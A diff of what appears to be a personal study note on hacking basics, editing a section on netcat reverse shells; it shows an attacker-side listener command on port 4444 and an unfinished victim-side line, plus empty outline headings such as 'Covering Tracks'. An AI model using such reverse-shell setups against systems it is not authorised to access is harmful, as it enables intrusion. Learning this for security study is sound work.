@@ -121,9 +121,13 @@ smbclient \\\\{IP address}\\{repository name}
 To perform these attacks, we use the `nc` command (*netcat*). 
 Reverse shell is when the target connects to the attacker like this :
 ```bash
-# The attacker sets up a listener on a specific port
-nc -lvp {port_number}
+# Attacker's machine
+nc -lvp 4444
 
+# Victim's machine
+nc }
+```
+> l for listening, v for verbose, p for port
 ## Gaining Access
 ## Maintaining Access
 ## Covering Tracks
@@ -131,11 +135,11 @@ nc -lvp {port_number}
 Read:
 Darknet diaries
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjU5NTc4NTg2LDE4MTgxNzYyMTksLTEwOT
-c4OTE4MTMsMjA1NDE3MDg1NCwxNTM0NjkyMjU0LC0zNjMxNjIw
-MDksNDkyODkxMzU0LC0xNDk4MjMxMDEsMTg2NTYyMjgxMCwtMj
-A4MTQ2MzIxNCwtMTAxODM2MjY3LC00NzQ5OTA5ODgsLTE0NzMx
-MTUzNiwtMTI0NDE5NzI5OCw3NjI3ODIxNjIsLTE4MzEzMzk4OS
-w0NjIwMjY2NzUsLTExNzY5NTc2OTMsLTEwMDc1MTIyMDgsLTUz
-MzcyNjg1MV19
+eyJoaXN0b3J5IjpbLTIwOTYwNjkwNTYsMTgxODE3NjIxOSwtMT
+A5Nzg5MTgxMywyMDU0MTcwODU0LDE1MzQ2OTIyNTQsLTM2MzE2
+MjAwOSw0OTI4OTEzNTQsLTE0OTgyMzEwMSwxODY1NjIyODEwLC
+0yMDgxNDYzMjE0LC0xMDE4MzYyNjcsLTQ3NDk5MDk4OCwtMTQ3
+MzExNTM2LC0xMjQ0MTk3Mjk4LDc2Mjc4MjE2MiwtMTgzMTMzOT
+g5LDQ2MjAyNjY3NSwtMTE3Njk1NzY5MywtMTAwNzUxMjIwOCwt
+NTMzNzI2ODUxXX0=
 -->
